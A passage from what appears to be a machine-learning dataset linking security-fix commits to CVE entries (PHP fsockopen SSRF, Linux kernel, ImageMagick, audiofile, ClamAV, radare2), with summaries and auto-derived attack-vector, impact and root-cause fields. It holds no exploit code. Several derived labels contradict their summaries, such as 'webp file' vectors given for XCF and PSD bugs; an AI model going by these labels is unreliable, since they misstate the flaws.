invalid.\n\nUnfortunately, PHP parses the address looking for the first colon\n(with special handling for IPv6, don't worry) and calls atoi()\nfrom there.  atoi() in turn, simply stops parsing at the first\nnon-numeric character and returns the value so far.\n\nThe end result is that the explicitly supplied port is treated\nas ignored garbage, rather than producing an error.\n\nThis diff replaces atoi() with strtol() and inspects the\nstop character.  If additional \"garbage\" of any kind is found,\nit fails and returns an error.","summary":"PHP through 7.1.11 enables potential SSRF in applications that accept an fsockopen or pfsockopen hostname argument with an expectation that the port number is constrained. Because a :port syntax is recognized, fsockopen will use the port number that is specified in the hostname argument, instead of the port number in the second argument of the function.","commit_message_1":"detect invalid port in xp_socket parse ip address for historical reason , fsockopen ( ) accepts the port and hostname separately : fsockopen ( '<file>","Vulnerability Type":"Server-Side Request Forgery (SSRF)","Attack Vector":"By using a specially-crafted argument","Impact":"conduct SSRF attack","Root Cause":"cause by a flaw","Attack Type":"attacker"},{"commit_id":"77b2631c78461965bc9a7414aae206b5c514e1b3","cve_id":"CVE-2017-7191","cwe_id":"CWE-416","commit_message":"Merge branch 'netjoin-timeout' into 'master'\n\nfe-netjoin: remove irc servers on \"server disconnected\" signal\n\nCloses #7\n\nSee merge request !10","summary":"The netjoin processing in Irssi 1.x before 1.0.2 allows attackers to cause a denial of service (use-after-free) and possibly execute arbitrary code via unspecified vectors.","commit_message_1":"merge branch 'netjoin-timeout ' into 'master '","Vulnerability Type":"Use After Free","Attack Vector":"By using an unspecified vector","Impact":"cause a denial of service ( use - after - free ) and possibly execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"attacker"},{"commit_id":"042eb437973a202d00589b13d628181c6de5cf5b","cve_id":"CVE-2017-7185","cwe_id":"CWE-416","commit_message":"Fix crash in multipart handling\n\nClose cesanta\/dev#6974\n\nPUBLISHED_FROM=4d4e4a46eceba10aec8dacb7f8f58bd078c92307","summary":"Use-after-free vulnerability in the mg_http_multipart_wait_for_boundary function in mongoose.c in Cesanta Mongoose Embedded Web Server Library 6.7 and earlier and Mongoose OS 1.2 and earlier allows remote attackers to cause a denial of service (crash) via a multipart\/form-data POST request without a MIME boundary string.","commit_message_1":"fix crash in multipart handling","Vulnerability Type":"Use After Free","Attack Vector":"via a multipart \/ form - data post request without a mime boundary string","Impact":"cause a denial of service ( crash )","Root Cause":"caused by use-after-free issue","Attack Type":"remote attacker"},{"commit_id":"f843ee6dd019bcece3e74e76ad9df0155655d0df","cve_id":"CVE-2017-7184","cwe_id":null,"commit_message":"xfrm_user: validate XFRM_MSG_NEWAE incoming ESN size harder\n\nKees Cook has pointed out that xfrm_replay_state_esn_len() is subject to\nwrapping issues.  To ensure we are correctly ensuring that the two ESN\nstructures are the same size compare both the overall size as reported\nby xfrm_replay_state_esn_len() and the internal length are the same.\n\nCVE-2017-7184\nSigned-off-by: Andy Whitcroft <apw@canonical.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The xfrm_replay_verify_len function in net\/xfrm\/xfrm_user.c in the Linux kernel through 4.10.6 does not validate certain size data after an XFRM_MSG_NEWAE update, which allows local users to obtain root privileges or cause a denial of service (heap-based out-of-bounds access) by leveraging the CAP_NET_ADMIN capability, as demonstrated during a Pwn2Own competition at CanSecWest 2017 for the Ubuntu 16.10 linux-image-* package 4.8.0.41.52.","commit_message_1":"validate xfrm_msg_newae incoming esn size harder kees cook ha pointed out that xfrm_replay_state_esn_len ( ) is subject to wrapping issue","Vulnerability Type":"heap-based out-of-bounds access","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"obtain root privileges or cause a denial of service ( heap - based out - of - bounds access )","Root Cause":"does not validate certain size data after an xfrm _ msg _ newae update","Attack Type":"local attacker"},{"commit_id":"4a04f814b15762eb446a5ead4d69d021512df6f8","cve_id":"CVE-2017-7177","cwe_id":"CWE-358","commit_message":"defrag - take protocol into account during re-assembly\n\nThe IP protocol was not being used to match fragments with\ntheir packets allowing a carefully constructed packet\nwith a different protocol to be matched, allowing re-assembly\nto complete, creating a packet that would not be re-assembled\nby the destination host.","summary":"Suricata before 3.2.1 has an IPv4 defragmentation evasion issue caused by lack of a check for the IP protocol during fragment matching.","commit_message_1":"defrag - take protocol into account during re-assembly the ip protocol wa not being used to match fragment with their packet allowing a carefully constructed packet with a different protocol to be matched , allowing re-assembly to complete , creating a packet that would not be re-assembled by the destination host","Vulnerability Type":"Improperly Implemented Security Check for Standard","Attack Vector":"By sending specially-crafted IPv4 packets","Impact":"cause a denial of service","Root Cause":"caused by improper handling of IP protocol during fragment matching","Attack Type":"remote attacker"},{"commit_id":"6fe86eef621b9849f51a5e1e5d73258a93440403","cve_id":"CVE-2017-6952","cwe_id":"CWE-190","commit_message":"provide a validity check to prevent against Integer overflow conditions (#870)\n\n* provide a validity check to prevent against Integer overflow conditions\n\n* fix some style issues.","summary":"Integer overflow in the cs_winkernel_malloc function in winkernel_mm.c in Capstone 3.0.4 and earlier allows attackers to cause a denial of service (heap-based buffer overflow in a kernel driver) or possibly have unspecified other impact via a large value.","commit_message_1":"provide a validity check to prevent against integer overflow condition ( # <number> ) * provide a validity check to prevent against integer overflow condition * fix some style issue","Vulnerability Type":"integer overflow","Attack Vector":"via a large value","Impact":"cause a denial of service ( heap - based buffer overflow in a kernel driver ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"8956a35e7b91c4a0dd1fa6db1d28c7f0efbab2d7","cve_id":"CVE-2017-6903","cwe_id":"CWE-269","commit_message":"Shared: Merge ioquake\/ioq3@376267d534476a875d8b9228149c4ee18b74a4fd\n\nDon't load .pk3s as .dlls, and don't load user config files from .pk3s.","summary":"In ioquake3 before 2017-03-14, the auto-downloading feature has insufficient content restrictions. This also affects Quake III Arena, OpenArena, OpenJK, iortcw, and other id Tech 3 (aka Quake 3 engine) forks. A malicious auto-downloaded file can trigger loading of crafted auto-downloaded files as native code DLLs. A malicious auto-downloaded file can contain configuration defaults that override the user's. Executable bytecode in a malicious auto-downloaded file can set configuration variables to values that will result in unwanted native code DLLs being loaded, resulting in sandbox escape.","commit_message_1":"merge ioquake\/ioq3 @ 376267d534476a875d8b9228149c4ee18b74a4fd do n't load","Vulnerability Type":"Improper Privilege Management","Attack Vector":"By using a specially-crafted auto-downloaded file","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"f833c53cb596e9e1792949f762e0b33661822748","cve_id":"CVE-2017-6892","cwe_id":"CWE-119","commit_message":"src\/aiff.c: Fix a buffer read overflow\n\nSecunia Advisory SA76717.\n\nFound by: Laurent Delosieres, Secunia Research at Flexera Software","summary":"In libsndfile version 1.0.28, an error in the *aiff_read_chanmap()* function (aiff.c) can be exploited to cause an out-of-bounds read memory access via a specially crafted AIFF file.","commit_message_1":"src\/<file> : fix a buffer read overflow secunia advisory sa76717","Vulnerability Type":"buffer overflow","Attack Vector":"via a specially crafted AIFF file","Impact":"obtain sensitive information","Root Cause":"caused by an out-of-bounds read memory access flaw","Attack Type":"remote attacker"},{"commit_id":"194f592e205990ea8fce72b6c571c14350aca716","cve_id":"CVE-2017-6890","cwe_id":"CWE-119","commit_message":"Fixed possible foveon buffer overrun (Secunia SA750000)","summary":"A boundary error within the *foveon_load_camf()* function (dcraw_foveon.c) when initializing a huffman table in LibRaw-demosaic-pack-GPL2 before 0.18.2 can be exploited to cause a stack-based buffer overflow.","commit_message_1":"fixed possible foveon buffer overrun ( secunia sa750000 )","Vulnerability Type":"buffer overflow","Attack Vector":"when initializing a huffman table in LibRaw-demosaic-pack-GPL2","Impact":"a stack-based buffer overflow","Root Cause":"caused by improper bounds checking by the foveon_load_camf() function","Attack Type":"remote attacker"},{"commit_id":"d7c3d2cb460be10a3ea7b32e9443a83c243b2251","cve_id":"CVE-2017-6887","cwe_id":"CWE-119","commit_message":"Secunia SA75000 advisory: several buffer overruns","summary":"A boundary error within the *parse_tiff_ifd()* function (internal\/dcraw_common.cpp) in LibRaw versions before 0.18.2 can be exploited to cause a memory corruption via e.g. a specially crafted KDC file with model set to *DSLR-A100* and containing multiple sequences of 0x100 and 0x14A TAGs.","commit_message_1":"secunia sa75000 advisory : several buffer overrun","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted KDC file","Impact":"cause a denial of service","Root Cause":"caused by memory corruption","Attack Type":"remote attacker"},{"commit_id":"040757f738e13caaa9c5078bca79aa97e11dde88","cve_id":"CVE-2017-6874","cwe_id":"CWE-416","commit_message":"ucount: Remove the atomicity from ucount->count\n\nAlways increment\/decrement ucount->count under the ucounts_lock.  The\nincrements are there already and moving the decrements there means the\nlocking logic of the code is simpler.  This simplification in the\nlocking logic fixes a race between put_ucounts and get_ucounts that\ncould result in a use-after-free because the count could go zero then\nbe found by get_ucounts and then be freed by put_ucounts.\n\nA bug presumably this one was found by a combination of syzkaller and\nKASAN.  JongWhan Kim reported the syzkaller failure and Dmitry Vyukov\nspotted the race in the code.\n\nCc: stable@vger.kernel.org\nFixes: f6b2db1a3e8d (\"userns: Make the count of user namespaces per user\")\nReported-by: JongHwan Kim <zzoru007@gmail.com>\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nReviewed-by: Andrei Vagin <avagin@gmail.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"Race condition in kernel\/ucount.c in the Linux kernel through 4.10.2 allows local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via crafted system calls that leverage certain decrement behavior that causes incorrect interaction between put_ucounts and get_ucounts.","commit_message_1":"remove the atomicity from ucount- > count always increment\/decrement ucount- > count under the ucounts_lock","Vulnerability Type":"Use After Free","Attack Vector":"via crafted system calls that leverage certain decrement behavior that causes incorrect interaction between put _ ucounts and get _ ucounts","Impact":"cause a denial of service ( use - after - free and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"e96fc4fdd525fa0ede28074a7e2b1caf94b58b0d","cve_id":"CVE-2017-6850","cwe_id":"CWE-476","commit_message":"Fixed bugs due to uninitialized data in the JP2 decoder.\nAlso, added some comments marking I\/O stream interfaces that probably\nneed to be changed (in the long term) to fix integer overflow problems.","summary":"The jp2_cdef_destroy function in jp2_cod.c in JasPer before 2.0.13 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted image.","commit_message_1":"fixed bug due to uninitialized data in the jp2 decoder","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted image","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"beacc44eb8cdf6d58717ec1a5103c5141f1b37f9","cve_id":"CVE-2017-6839","cwe_id":"CWE-190","commit_message":"Check for multiplication overflow in MSADPCM decodeSample\n\nCheck for multiplication overflow (using __builtin_mul_overflow\nif available) in MSADPCM.cpp decodeSample and return an empty\ndecoded block if an error occurs.\n\nThis fixes the 00193-audiofile-signintoverflow-MSADPCM case of #41","summary":"Integer overflow in modules\/MSADPCM.cpp in Audio File Library (aka audiofile) 0.3.6 allows remote attackers to cause a denial of service (crash) via a crafted file.","commit_message_1":"check for multiplication overflow in msadpcm decodesample check for multiplication overflow ( using __builtin_mul_overflow if available ) in <file> decodesample and return an empty decoded block if an error occurs","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"7d65f89defb092b63bcbc5d98349fb222ca73b3c","cve_id":"CVE-2017-6838","cwe_id":"CWE-190","commit_message":"Check for multiplication overflow in sfconvert\n\nChecks that a multiplication doesn't overflow when\ncalculating the buffer size, and if it overflows,\nreduce the buffer size instead of failing.\n\nThis fixes the 00192-audiofile-signintoverflow-sfconvert case\nin #41","summary":"Integer overflow in sfcommands\/sfconvert.c in Audio File Library (aka audiofile) 0.3.6 allows remote attackers to cause a denial of service (crash) via a crafted file.","commit_message_1":"check for multiplication overflow in sfconvert check that a multiplication doe n't overflow when calculating the buffer size , and if it overflow , reduce the buffer size instead of failing","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"c48e4c6503f7dabd41f11d4c9c7b7f8960e7f2c0","cve_id":"CVE-2017-6837","cwe_id":"CWE-20","commit_message":"Always check the number of coefficients\n\nWhen building the library with NDEBUG, asserts are eliminated\nso it's better to always check that the number of coefficients\nis inside the array range.\n\nThis fixes the 00191-audiofile-indexoob issue in #41","summary":"WAVE.cpp in Audio File Library (aka audiofile) 0.3.6 allows remote attackers to cause a denial of service (crash) via vectors related to a large number of coefficients.","commit_message_1":"always check the number of coefficient when building the library with ndebug , asserts are eliminated so it 's better to always check that the number of coefficient is inside the array range","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors related to a large number of coefficients","Impact":"cause a denial of service ( crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"a2e9eab8ea87c4ffc494d839ebb4ea145eb9f2e6","cve_id":"CVE-2017-6831","cwe_id":"CWE-119","commit_message":"Actually fail when error occurs in parseFormat\n\nWhen there's an unsupported number of bits per sample or an invalid\nnumber of samples per block, don't only print an error message using\nthe error handler, but actually stop parsing the file.\n\nThis fixes #35 (also reported at\nhttps:\/\/bugzilla.opensuse.org\/show_bug.cgi?id=1026983 and\nhttps:\/\/blogs.gentoo.org\/ago\/2017\/02\/20\/audiofile-heap-based-buffer-overflow-in-imadecodeblockwave-ima-cpp\/\n)","summary":"Heap-based buffer overflow in the decodeBlockWAVE function in IMA.cpp in Audio File Library (aka audiofile) 0.3.6 allows remote attackers to cause a denial of service (crash) via a crafted file.","commit_message_1":"actually fail when error occurs in parseformat when there 's an unsupported number of bit per sample or an invalid number of sample per block , do n't only print an error message using the error handler , but actually stop parsing the file","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( crash )","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"25eb00ce913452c2e614548d7df93070bf0d066f","cve_id":"CVE-2017-6829","cwe_id":"CWE-125","commit_message":"clamp index values to fix index overflow in IMA.cpp\n\nThis fixes #33\n(also reported at https:\/\/bugzilla.opensuse.org\/show_bug.cgi?id=1026981\nand https:\/\/blogs.gentoo.org\/ago\/2017\/02\/20\/audiofile-global-buffer-overflow-in-decodesample-ima-cpp\/)","summary":"The decodeSample function in IMA.cpp in Audio File Library (aka audiofile) 0.3.6 allows remote attackers to cause a denial of service (crash) via a crafted file.","commit_message_1":"clamp index value to fix index overflow in <file> this fix # <number> ( also reported at http : \/\/<file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"b1e699103f08d6a0ca46a122193c9da65f6cf837","cve_id":"CVE-2017-6594","cwe_id":"CWE-295","commit_message":"Fix transit path validation CVE-2017-6594\n\nCommit f469fc6 (2010-10-02) inadvertently caused the previous hop realm\nto not be added to the transit path of issued tickets.  This may, in\nsome cases, enable bypass of capath policy in Heimdal versions 1.5\nthrough 7.2.\n\nNote, this may break sites that rely on the bug.  With the bug some\nincomplete [capaths] worked, that should not have.  These may now break\nauthentication in some cross-realm configurations.","summary":"The transit path validation code in Heimdal before 7.3 might allow attackers to bypass the capath policy protection mechanism by leveraging failure to add the previous hop realm to the transit path of issued tickets.","commit_message_1":"fix transit path validation <cve_id> commit f469fc6 ( ) inadvertently caused the previous hop realm to not be added to the transit path of issued ticket","Vulnerability Type":"Improper Certificate Validation","Attack Vector":"by leveraging failure to add the previous hop realm to the transit path of issued tickets .","Impact":"bypass the capath policy protection mechanism","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"f5ad04766f4abaa78374ff03704316f8ce04627d","cve_id":"CVE-2017-6504","cwe_id":"CWE-20","commit_message":"[WebUI] Avoid clickjacking attacks","summary":"WebUI in qBittorrent before 3.3.11 did not set the X-Frame-Options header, which could potentially lead to clickjacking.","commit_message_1":"avoid clickjacking attack","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to visit a malicious Web site","Impact":"hijack the clicking action of the victim","Root Cause":"did not set the x - frame - options header , which could potentially lead to clickjacking","Attack Type":"remote attacker"},{"commit_id":"6ca3e4f094da0a0017cb2d483ec1db6176bb0b16","cve_id":"CVE-2017-6503","cwe_id":"CWE-79","commit_message":"Add Utils::String::toHtmlEscaped","summary":"WebUI in qBittorrent before 3.3.11 did not escape many values, which could potentially lead to XSS.","commit_message_1":"add utils : :string : :tohtmlescaped","Vulnerability Type":"Cross-site Scripting","Attack Vector":"using the multiple parameters in a specially-crafted URL to execute script in a victim's Web browser within the security context of the hosting Web site","Impact":"steal the victim's cookie-based authentication credentials","Root Cause":"did not escape many values , which could potentially lead to xss","Attack Type":"remote attacker"},{"commit_id":"126c7c98ea788241922c30df4a5633ea692cf8df","cve_id":"CVE-2017-6502","cwe_id":"CWE-119","commit_message":"Fixed fd leak for webp coder (patch from #382)","summary":"An issue was discovered in ImageMagick 6.9.7. A specially crafted webp file could lead to a file-descriptor leak in libmagickcore (thus, a DoS).","commit_message_1":"fixed fd leak for webp coder ( patch from # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially crafted webp file","Impact":"cause a denial of service","Root Cause":"caused by a file-descriptor leak error","Attack Type":"remote attacker"},{"commit_id":"d31fec57e9dfb0516deead2053a856e3c71e9751","cve_id":"CVE-2017-6501","cwe_id":"CWE-476","commit_message":"Check for image list before we destroy the last image in XCF coder (patch sent privately by \u0410\u043d\u0434\u0440\u0435\u0439 \u0427\u0435\u0440\u043d\u044b\u0439)","summary":"An issue was discovered in ImageMagick 6.9.7. A specially crafted xcf file could lead to a NULL pointer dereference.","commit_message_1":"check for image list before we destroy the last image in xcf coder ( patch sent privately by \u0430\u043d\u0434\u0440\u0435\u0439 \u0447\u0435\u0440\u043d\u044b\u0439 )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially crafted webp file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference error","Attack Type":"attacker"},{"commit_id":"3007531bfd326c5c1e29cd41d2cd80c166de8528","cve_id":"CVE-2017-6500","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/375\nhttps:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/376","summary":"An issue was discovered in ImageMagick 6.9.7. A specially crafted sun file triggers a heap-based buffer over-read.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially crafted SUN file","Impact":"overflow a buffer and execute arbitrary code on the system or cause the application to crash","Root Cause":"caused by improper bounds checking by coders\/sun.c","Attack Type":"remote attacker"},{"commit_id":"3358f060fc182551822576b2c0a8850faab5d543","cve_id":"CVE-2017-6499","cwe_id":"CWE-772","commit_message":"Fixed memory leak when creating nested exceptions in Magick++.","summary":"An issue was discovered in Magick++ in ImageMagick 6.9.7. A specially crafted file creating a nested exception could lead to a memory leak (thus, a DoS).","commit_message_1":"fixed memory leak when creating nested exception in magick++","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"65f75a32a93ae4044c528a987a68366ecd4b46b9","cve_id":"CVE-2017-6498","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/pull\/359","summary":"An issue was discovered in ImageMagick 6.9.7. Incorrect TGA files could trigger assertion failures, thus leading to DoS.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/pull\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially crafted TGA file","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"7f2dc7a1afc067d0c89f12c82bcdec0445fb1b94","cve_id":"CVE-2017-6497","cwe_id":"CWE-476","commit_message":"Added missing null check.","summary":"An issue was discovered in ImageMagick 6.9.7. A specially crafted psd file could lead to a NULL pointer dereference (thus, a DoS).","commit_message_1":"added missing null check","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially crafted webp file","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"f41e941341e44aa86edd4483c4487ec09a074257","cve_id":"CVE-2017-6448","cwe_id":"CWE-119","commit_message":"Fix #6885 - oob write in dalvik_disassemble","summary":"The dalvik_disassemble function in libr\/asm\/p\/asm_dalvik.c in radare2 1.2.1 allows remote attackers to cause a denial of service (stack-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted DEX file.","commit_message_1":"fix # <number> - oob write in dalvik_disassemble","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted dex file","Impact":"cause a denial of service ( stack - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"32ee5213fe64f1e10ec76c1ee861ee6f233120dd","cve_id":"CVE-2017-6439","cwe_id":"CWE-787","commit_message":"bplist: Fix data range check for string\/data\/dict\/array nodes\n\nPassing a size of 0xFFFFFFFFFFFFFFFF to parse_string_node() might result\nin a memcpy with a size of -1, leading to undefined behavior.\nThis commit makes sure that the actual node data (which depends on the size)\nis in the range start_of_object..start_of_object+size.\n\nCredit to OSS-Fuzz","summary":"Heap-based buffer overflow in the parse_string_node function in bplist.c in libimobiledevice libplist 1.12 allows local users to cause a denial of service (out-of-bounds write) via a crafted plist file.","commit_message_1":"fix data range check for string\/data\/dict\/array node passing a size of 0xffffffffffffffff to parse_string_node ( ) might result in a memcpy with a size of -<number> , leading to undefined behavior","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted plist file","Impact":"cause a denial of service","Root Cause":"caused by improper bounds checking by the parse_string_node function","Attack Type":"local attacker"},{"commit_id":"fbd8494d5e4e46bf2e90cb6116903e404374fb56","cve_id":"CVE-2017-6435","cwe_id":"CWE-119","commit_message":"bplist: Make sure to bail out if malloc() fails in parse_string_node()\n\nCredit to Wang Junjie <zhunkibatu@gmail.com> (#93)","summary":"The parse_string_node function in bplist.c in libimobiledevice libplist 1.12 allows local users to cause a denial of service (memory corruption) via a crafted plist file.","commit_message_1":"make sure to bail out if malloc ( ) fails in parse_string_node ( ) credit to wang junjie < zhunkibatu @ <file> > ( # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted plist file","Impact":"cause a denial of service ( memory corruption )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"626dc56686f15f2dda13c48f78c2a666cb6d8506","cve_id":"CVE-2017-6430","cwe_id":"CWE-125","commit_message":"Exit gracefully in case of corrupted filters (Closes issue #782)","summary":"The compile_tree function in ef_compiler.c in the Etterfilter utility in Ettercap 0.8.2 and earlier allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted filter.","commit_message_1":"exit gracefully in case of corrupted filter ( close issue # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted filter","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"d689d14dbcd768c028eab2fb378d849e543dcfe9","cve_id":"CVE-2017-6429","cwe_id":"CWE-119","commit_message":"#278 fail if capture has a packet that is too large (#286)\n\n* #278 fail if capture has a packet that is too large\n\n* Update CHANGELOG","summary":"Buffer overflow in the tcpcapinfo utility in Tcpreplay before 4.2.0 Beta 1 allows remote attackers to have unspecified impact via a pcap file with an over-size packet.","commit_message_1":"# <number> fail if capture ha a packet that is too large ( # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"via a pcap file with an over - size packet","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking","Attack Type":"remote attacker"},{"commit_id":"dfc00cd3301a42b571454b51a6102eecf58407bc","cve_id":"CVE-2017-6420","cwe_id":"CWE-416","commit_message":"bb19798 - fix out of bound memory access for crafted wwunpack file.","summary":"The wwunpack function in libclamav\/wwunpack.c in ClamAV 0.99.2 allows remote attackers to cause a denial of service (use-after-free) via a crafted PE file with WWPack compression.","commit_message_1":"bb19798 - fix out of bound memory access for crafted wwunpack file","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted pe file with wwpack compression","Impact":"cause a denial of service ( use - after - free )","Root Cause":"caused by a use-after-free flaw","Attack Type":"remote attacker"},{"commit_id":"a83773682e856ad6529ba6db8d1792e6d515d7f1","cve_id":"CVE-2017-6419","cwe_id":"CWE-119","commit_message":"fixing potential OOB window write when unpacking chm files","summary":"mspack\/lzxd.c in libmspack 0.5alpha, as used in ClamAV 0.99.2, allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted CHM file.","commit_message_1":"fixing potential oob window write when unpacking chm file","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted chm file","Impact":"cause a denial of service ( heap - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"586a5180287262070637c8943f2f7efd652e4a2c","cve_id":"CVE-2017-6418","cwe_id":"CWE-125","commit_message":"bb11797 - fix invalid read in fuzzed mail file.","summary":"libclamav\/message.c in ClamAV 0.99.2 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted e-mail message.","commit_message_1":"bb11797 - fix invalid read in fuzzed mail file","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted e - mail message","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"252afb1cff9676f3ae1f341a28448bf2c8b6e308","cve_id":"CVE-2017-6415","cwe_id":"CWE-476","commit_message":"fix #6872","summary":"The dex_parse_debug_item function in libr\/bin\/p\/bin_dex.c in radare2 1.2.1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted DEX file.","commit_message_1":"fix # <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted dex file","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference error","Attack Type":"remote attacker"},{"commit_id":"21e3728a825c41ab41efa75e664108051bb9665e","cve_id":"CVE-2017-6413","cwe_id":"CWE-287","commit_message":"release 2.1.6 : security fix: scrub headers for \"AuthType oauth20\"\n\nSigned-off-by: Hans Zandbelt <hans.zandbelt@zmartzone.eu>","summary":"The *OpenID Connect Relying Party and OAuth 2.0 Resource Server* (aka mod_auth_openidc) module before 2.1.6 for the Apache HTTP Server does not skip OIDC_CLAIM_ and OIDCAuthNHeader headers in an *AuthType oauth20* configuration, which allows remote attackers to bypass authentication via crafted HTTP traffic.","commit_message_1":"security fix : scrub header for `` authtype oauth20 ''","Vulnerability Type":"Improper Authentication","Attack Vector":"via crafted http traffic","Impact":"bypass authentication","Root Cause":"does not skip oidc _ claim _ and oidcauthnheader headers","Attack Type":"remote attacker"},{"commit_id":"ead645853a63bf83d8386702cad0cf23b31d7eeb","cve_id":"CVE-2017-6387","cwe_id":"CWE-125","commit_message":"fix #6857","summary":"The dex_loadcode function in libr\/bin\/p\/bin_dex.c in radare2 1.2.1 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted DEX file.","commit_message_1":"fix # <number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted dex file","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"caused by an out-of-bound read error","Attack Type":"remote attacker"},{"commit_id":"dfcb9f4f99f1e9a49e43398a7bfbf56927544af1","cve_id":"CVE-2017-6353","cwe_id":"CWE-415","commit_message":"sctp: deny peeloff operation on asocs with threads sleeping on it\n\ncommit 2dcab5984841 (\"sctp: avoid BUG_ON on sctp_wait_for_sndbuf\")\nattempted to avoid a BUG_ON call when the association being used for a\nsendmsg() is blocked waiting for more sndbuf and another thread did a\npeeloff operation on such asoc, moving it to another socket.\n\nAs Ben Hutchings noticed, then in such case it would return without\nlocking back the socket and would cause two unlocks in a row.\n\nFurther analysis also revealed that it could allow a double free if the\napplication managed to peeloff the asoc that is created during the\nsendmsg call, because then sctp_sendmsg() would try to free the asoc\nthat was created only for that call.\n\nThis patch takes another approach. It will deny the peeloff operation\nif there is a thread sleeping on the asoc, so this situation doesn't\nexist anymore. This avoids the issues described above and also honors\nthe syscalls that are already being handled (it can be multiple sendmsg\ncalls).\n\nJoint work with Xin Long.\n\nFixes: 2dcab5984841 (\"sctp: avoid BUG_ON on sctp_wait_for_sndbuf\")\nCc: Alexander Popov <alex.popov@linux.com>\nCc: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>\nSigned-off-by: Xin Long <lucien.xin@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/sctp\/socket.c in the Linux kernel through 4.10.1 does not properly restrict association peel-off operations during certain wait states, which allows local users to cause a denial of service (invalid unlock and double free) via a multithreaded application.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2017-5986.","commit_message_1":"deny peeloff operation on asocs with thread sleeping on it commit 2dcab5984841 ( `` sctp : avoid bug_on on sctp_wait_for_sndbuf '' ) attempted to avoid a bug_on call when the association being used for a sendmsg ( ) is blocked waiting for more sndbuf and another thread did a peeloff operation on such asoc , moving it to another socket","Vulnerability Type":"double free","Attack Vector":"via a multithreaded application","Impact":"cause a 